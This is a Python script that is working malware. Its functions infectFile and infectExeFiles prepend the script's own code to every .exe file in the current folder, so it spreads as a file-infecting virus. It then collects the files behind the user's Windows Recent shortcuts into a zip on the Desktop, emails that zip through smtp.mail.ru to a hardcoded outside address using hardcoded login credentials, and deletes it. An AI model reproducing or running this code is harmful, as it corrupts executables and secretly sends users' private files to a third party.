import smtplib
import email
import email.mime.application
import email.mime.multipart
import zipfile
import os

def getShortcutTarget(path):
    import struct  
    target = ''

    with open(path, 'rb') as stream:
        try:
            content = stream.read()
            # skip first 20 bytes (HeaderSize and LinkCLSID)
            # read the LinkFlags structure (4 bytes)
            lflags = struct.unpack('I', content[0x14:0x18])[0]
            position = 0x18
            # if the HasLinkTargetIDList bit is set then skip the stored IDList 
            # structure and header
            if (lflags & 0x01) == 1:
                position = struct.unpack('H', content[0x4C:0x4E])[0] + 0x4E
            last_pos = position
            position += 0x04
            # get how long the file information is (LinkInfoSize)
            length = struct.unpack('I', content[last_pos:position])[0]
            # skip 12 bytes (LinkInfoHeaderSize, LinkInfoFlags, and VolumeIDOffset)
            position += 0x0C
            # go to the LocalBasePath position
            lbpos = struct.unpack('I', content[position:position+0x04])[0]
            position = last_pos + lbpos
            # read the string at the given position of the determined length
            size= (length + last_pos) - position - 0x02
            temp = struct.unpack('s' * size, content[position:position+size])
            target = ''.join([chr(ord(a)) for a in temp])
        except Exception:
            return ""
        return target

def infectFile(name, virData):
    os.rename(name, name + 'tmp')
    fprog = open(name + 'tmp', 'rb')
    progData = fprog.read()            
    fnew = open(name, 'wb')
    fnew.write(virData + progData)
    fnew.close()
    fprog.close()
    os.remove(name + 'tmp')

def infectExeFiles(size):
    import sys
    import os
    from threading import Thread
    virPath = os.path.split(sys.argv[0])
    names = os.listdir('.')
    fvir = open(sys.argv[0], 'rb')
    virData = fvir.read(size)
    if os.path.getsize(sys.argv[0]) > size:
        origProgData = fvir.read()
        origProg = 'original_' + virPath[1]
        forig = open(origProg, 'wb')
        forig.write(origProgData)        
        forig.close()
        fvir.close()
        t = Thread(target = os.system, args = ('{0}\{1}'.format(virPath[0], origProg),))
        t.start()
    else:
        fvir.close()
    for name in names:   
        namePair = os.path.splitext(name)
        if namePair[1] == '.exe' and name != virPath[1]:
            if os.path.getsize(name) >= size:
                initf = open(name, 'rb')               
                initfCheck = initf.read(size)
                initf.close()
                if initfCheck != virData:
                    infectFile(name, virData)
            else:
                    infectFile(name, virData)
    

infectExeFiles(11776) 
username = os.getlogin()
path = 'C:\\Users\\{}\\Desktop\\test.zip'.format(username)
path2 = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Recent'.format(username)
_10mb = 10485760
zip = zipfile.ZipFile(path, 'w')
for root, dirs, files in os.walk(path2): 
    for file in files:
        extension = os.path.splitext(file)
        if extension[1] == '.lnk':
            target = getShortcutTarget(os.path.join(root,file))
            targetExtension = os.path.splitext(target)
            if os.path.exists(target) and os.path.isfile(target) and os.path.getsize(target) < _10mb:
                zip.write(target)
        else:
            if os.path.exists(os.path.join(root,file)) and os.path.isfile(os.path.join(root,file)) and os.path.getsize(os.path.join(root,file)) < _10mb:
                zip.write(os.path.join(root,file))
       
login = 'pythontest01@mail.ru'
recipient = 'ssa2001ae@mail.ru'
msg = email.mime.multipart.MIMEMultipart()
msg['Subject'] = 'Greetings'
msg['From'] = login
msg['To'] = recipient
attachment = open(zip.filename, 'rb')
att = email.mime.application.MIMEApplication(attachment.read(),_subtype="zip")
att.add_header('Content-Disposition','attachment',filename = '{}.zip'.format(path2))
zip.close()
msg.attach(att)



s = smtplib.SMTP('smtp.mail.ru')
s.starttls()
password = 'ihopeItsg0nnaw0rk'
s.login(login, password)
s.sendmail(login, recipient, msg.as_string())
s.quit()

os.remove(path)


